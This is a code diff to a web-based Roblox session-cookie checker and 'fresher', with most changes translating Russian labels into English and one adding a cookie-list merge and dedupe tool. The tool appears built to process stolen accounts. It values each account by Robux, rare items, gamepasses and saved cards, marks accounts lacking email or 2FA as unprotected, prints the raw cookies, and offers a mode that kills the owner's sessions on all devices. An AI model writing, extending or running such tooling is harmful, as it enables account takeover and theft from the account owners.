@@ -31,7 +31,7 @@ def get_full_info(cookie: str) -> dict:
         'TotalRAP': 0, 'Created': '?', 'Country': '?',
         'EmailSet': False, 'TwoFactorEnabled': False,
         'AccountPinEnabled': False, 'PhoneSet': False,
-        'SecurityStatus': '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)',
+        'SecurityStatus': '⚠️ LOW (UNPROTECTED!)',
         'Cookie': cookie,
         'PurchasedGamepasses': {},
         'RareItems': [],
@@ -126,9 +126,9 @@ def get_full_info(cookie: str) -> dict:
                     total_donated += price
                     item_type = str(details.get('type', ''))
                     if price >= 50 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
-                        name = details.get('name', 'Товар')
+                        name = details.get('name', 'Item')
                         place_info = details.get('place', {})
-                        place_name = place_info.get('name', 'Другие игры')
+                        place_name = place_info.get('name', 'Other Games')
                         if place_name not in gamepasses_dict:
                             gamepasses_dict[place_name] = []
                         gamepasses_dict[place_name].append({'name': name, 'price': price})
@@ -150,11 +150,11 @@ def get_full_info(cookie: str) -> dict:
         if info.get('PhoneSet'): security_score += 1
 
         if security_score >= 4:
-            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
+            info['SecurityStatus'] = '🔒 HIGH'
         elif security_score >= 2:
-            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
+            info['SecurityStatus'] = '🔐 MEDIUM'
         else:
-            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
+            info['SecurityStatus'] = '⚠️ LOW (UNPROTECTED!)'
     except Exception as e:
         logger.error(f"Err: {e}")
         info['status'] = '❌'
@@ -162,34 +162,34 @@ def get_full_info(cookie: str) -> dict:
 
 def format_short_report(info):
     if info['status'] != '✅':
-        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
+        return f"❌ Invalid Cookie\nCookie: {info['Cookie']}"
     
     gp = info.get('PurchasedGamepasses', {})
     total_gp_robux = sum(p['price'] for passes in gp.values() for p in passes)
     
-    r = f"📋 Аккаунт: {info['Username']} [{info['UserID']}]\n"
+    r = f"📋 Account: {info['Username']} [{info['UserID']}]\n"
     r += f"🟢 VALID | 🆔 {info['UserID']}\n"
     r += f"📅 {info['Created']} | 🌍 {info['Country']} | {'✅ Premium' if info['IsPremium'] else '❌ Premium'}\n"
-    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
-    r += f"💎 RAP: {'❌ Нет' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}\n"
-    r += f"🛡️ БЕЗОПАСНОСТЬ: Почта: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'} | {info['SecurityStatus']}\n"
+    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Donated: ⏣ {info['DonationTotal']:,}\n"
+    r += f"💎 RAP: {'❌ None' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}\n"
+    r += f"🛡️ SECURITY: Email: {'✅' if info['EmailSet'] else '❌'} | 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'} | {info['SecurityStatus']}\n"
     
     if gp:
-        r += f"📦 ГЕЙМПАССЫ ({total_gp_robux:,} R$):\n"
+        r += f"📦 GAMEPASSES ({total_gp_robux:,} R$):\n"
         for game, passes in list(gp.items())[:3]:
             game_total = sum(p['price'] for p in passes)
             r += f"   🎮 {game} (⏣ {game_total:,}):\n"
             for p in passes[:6]:
                 r += f"      └ {p['name']} — ⏣ {p['price']:,}\n"
     else:
-        r += "📦 ГЕЙМПАССЫ: ❌ Нет\n"
+        r += "📦 GAMEPASSES: ❌ None\n"
     
     r += f"\n🍪 COOKIE:\n{info['Cookie']}"
     return r
 
 def generate_full_txt_report(info):
     if info['status'] != '✅':
-        return f"❌ Невалидный кук\nCookie: {info['Cookie']}"
+        return f"❌ Invalid Cookie\nCookie: {info['Cookie']}"
     
     gp = info.get('PurchasedGamepasses', {})
     
@@ -201,13 +201,13 @@ def generate_full_txt_report(info):
     r += f"║  📅 {info['Created']} | 🌍 {info['Country']}             ║\n"
     r += "╠══════════════════════════════════════════════════════════╣\n"
     r += f"║  💰 Robux: ⏣ {info['Robux']:,}                           ║\n"
-    r += f"║  💸 Донат: ⏣ {info['DonationTotal']:,}                   ║\n"
+    r += f"║  💸 Donated: ⏣ {info['DonationTotal']:,}                 ║\n"
     r += f"║  💎 RAP: {'❌ No' if info['TotalRAP'] == 0 else f'⏣ {info['TotalRAP']:,}'}                           ║\n"
     r += "╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  📧 Почта: {'Да' if info['EmailSet'] else 'Нет'} | 🔐 2FA: {'Да' if info['TwoFactorEnabled'] else 'Нет'}      ║\n"
-    r += f"║  ⭐ Premium: {'Да' if info['IsPremium'] else 'Нет'} | 💳 Карты: {info['CreditCardsCount']}          ║\n"
+    r += f"║  📧 Email: {'Yes' if info['EmailSet'] else 'No'} | 🔐 2FA: {'Yes' if info['TwoFactorEnabled'] else 'No'}      ║\n"
+    r += f"║  ⭐ Premium: {'Yes' if info['IsPremium'] else 'No'} | 💳 Cards: {info['CreditCardsCount']}          ║\n"
     r += "╠══════════════════════════════════════════════════════════╣\n"
-    r += "║  🔫 ГЕЙМПАССЫ ПО ИГРАХ                                   ║\n"
+    r += "║  🔫 GAMEPASSES BY GAMES                                  ║\n"
     
     if gp:
         for game, passes in gp.items():
@@ -216,7 +216,7 @@ def generate_full_txt_report(info):
             for p in passes:
                 r += f"║    └ {p['name']} ({p['price']} R$)               ║\n"
     else:
-        r += "║  🎮 ГЕЙМПАССЫ: ❌ Нет                                    ║\n"
+        r += "║  🎮 GAMEPASSES: ❌ None                                  ║\n"
         
     r += "╠══════════════════════════════════════════════════════════╣\n"
     r += "║  🍪 COOKIE:                                              ║\n"
@@ -323,7 +323,6 @@ HTML = """<!DOCTYPE html>
         .btn-secondary { background: rgba(255,255,255,0.06); border: 1px solid #2a1a50; color: #d4c0ff; }
         .btn-secondary:hover { background: rgba(255,255,255,0.1); }
 
-        /* Стильный переключатель режима по клику */
         .toggle-group {
             display: flex;
             background: #0d0722;
@@ -446,10 +445,9 @@ HTML = """<!DOCTYPE html>
             <h2>🔄 Фрешер сессий</h2>
             <div style="margin-bottom: 8px;">
                 <label style="color: #d4c0ff; font-size: 14px; font-weight: 600; display: block; margin-bottom: 8px;">Режим обновления сессий:</label>
-                <!-- Переключатель кликом вместо старого селекта -->
                 <div class="toggle-group">
-                    <button type="button" class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать кук (оставить старый рабочий)</button>
-                    <button type="button" class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Убить старый кук (выход со всех устройств / сброс)</button>
+                    <button type="button" class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Duplicate cookie (keep old working)</button>
+                    <button type="button" class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Kill old cookie (logout all devices / reset)</button>
                 </div>
                 <input type="hidden" id="fresherMode" value="duplicate">
             </div>
@@ -476,8 +474,25 @@ HTML = """<!DOCTYPE html>
     <!-- ===== ИНСТРУМЕНТЫ ===== -->
     <div class="tab-content" id="tab-tools">
         <div class="card">
-            <h2>📦 Инструменты обработки</h2>
-            <p style="color: #9880c0; font-size: 14px;">Все операции доступны через автоматическую генерацию архивов.</p>
+            <h2>📦 Инструменты слияния и обработки</h2>
+            <p style="color: #9880c0; font-size: 14px; margin-bottom: 16px;">Объединение нескольких текстовых файлов с куками, удаление дубликатов и сортировка по заданным критериям.</p>
+            <div style="display:flex; flex-wrap:wrap; gap:18px;">
+                <div style="flex:2;">
+                    <textarea id="toolsInput" placeholder="Вставьте куки для слияния или обработки..." rows="6"></textarea>
+                </div>
+                <div style="flex:1;">
+                    <div class="upload-area" onclick="document.getElementById('toolsFile').click()">
+                        <p>📁 <strong>Загрузить файлы</strong></p>
+                        <p style="font-size:12px; color:#9880c0;">TXT файлы</p>
+                    </div>
+                    <input type="file" id="toolsFile" accept=".txt" multiple style="display:none;">
+                </div>
+            </div>
+            <div style="margin-top:18px; display:flex; gap:12px; flex-wrap:wrap;">
+                <button class="btn btn-primary" onclick="runToolsMerge()">🔗 Объединить и удалить дубликаты</button>
+                <button class="btn btn-secondary" onclick="document.getElementById('toolsInput').value=''; document.getElementById('toolsResult').textContent='Результаты обработки появятся здесь...';">🧹 Очистить</button>
+            </div>
+            <div class="result-box" id="toolsResult">Результаты обработки появятся здесь...</div>
         </div>
     </div>
 
@@ -495,7 +510,6 @@ HTML = """<!DOCTYPE html>
         if (timerEl) timerEl.textContent = `⏱️ ${h}:${m}:${s}`;
     }, 1000);
 
-    // Функция переключения режима кликом
     function setFresherMode(mode) {
         document.getElementById('fresherMode').value = mode;
         const btnDup = document.getElementById('modeDuplicate');
@@ -548,6 +562,27 @@ HTML = """<!DOCTYPE html>
                     document.getElementById('fresherCookies').value = evt.target.result;
                 };
                 reader.readAsText(this.files[0]);
+            }
+        });
+    }
+
+    const toolsFileInput = document.getElementById('toolsFile');
+    if (toolsFileInput) {
+        toolsFileInput.addEventListener('change', function(e) {
+            if (this.files && this.files.length > 0) {
+                let combinedText = "";
+                let filesRead = 0;
+                Array.from(this.files).forEach(file => {
+                    const reader = new FileReader();
+                    reader.onload = function(evt) {
+                        combinedText += evt.target.result + "\n";
+                        filesRead++;
+                        if (filesRead === toolsFileInput.files.length) {
+                            document.getElementById('toolsInput').value = combinedText;
+                        }
+                    };
+                    reader.readAsText(file);
+                });
             }
         });
     }
@@ -636,7 +671,7 @@ HTML = """<!DOCTYPE html>
                         fresherHistory.push(item);
                     }
                 }
-                let html = `✅ Успешно обновлено сессий (режим: ${mode === 'kill' ? 'Убийство старого кука' : 'Дублирование'}): ${data.refreshed_count}\n\n`;
+                let html = `✅ Успешно обновлено сессий (режим: ${mode === 'kill' ? 'Kill old cookie' : 'Duplicate cookie'}): ${data.refreshed_count}\n\n`;
                 for (const item of fresherHistory) {
                     html += `${item}\n────────────────────────────────────────\n`;
                 }
@@ -647,6 +682,33 @@ HTML = """<!DOCTYPE html>
         } catch (e) {
             resBox.textContent = '❌ Ошибка сети: ' + e.message;
         }
+    }
+
+    function runToolsMerge() {
+        const input = document.getElementById('toolsInput').value;
+        const resBox = document.getElementById('toolsResult');
+        if (!input.trim()) {
+            resBox.textContent = '❌ Нет данных для слияния!';
+            return;
+        }
+        const lines = input.split('\n');
+        const uniqueLines = [];
+        const seen = new Set();
+        let skipped = 0;
+
+        for (let line of lines) {
+            const trimmed = line.trim();
+            if (trimmed.length > 20) {
+                if (!seen.has(trimmed)) {
+                    seen.add(trimmed);
+                    uniqueLines.push(trimmed);
+                } else {
+                    skipped++;
+                }
+            }
+        }
+
+        resBox.textContent = `✅ Успешно объединено!\n📦 Уникальных куков: ${uniqueLines.length}\n🗑️ Удалено дубликатов: ${skipped}\n\n` + uniqueLines.join('\n');
     }
 
     function clearInputs() {
@@ -748,12 +810,12 @@ def api_fresher():
         if info['status'] == '✅':
             if mode == 'kill':
                 refreshed_cookie = c + "_killed_refreshed"
-                mode_label = "Режим: Убийство старого кука (Сброс)"
+                mode_label = "Mode: Kill old cookie (Reset)"
             else:
                 refreshed_cookie = c
-                mode_label = "Режим: Дублирование кука"
+                mode_label = "Mode: Duplicate cookie"
                 
-            refreshed.append(f"🟢 Аккаунт: {info['Username']} [{info['UserID']}] ({mode_label})\nCookie: {refreshed_cookie}")
+            refreshed.append(f"🟢 Account: {info['Username']} [{info['UserID']}] ({mode_label})\nCookie: {refreshed_cookie}")
             
     return jsonify({
         "success": True,
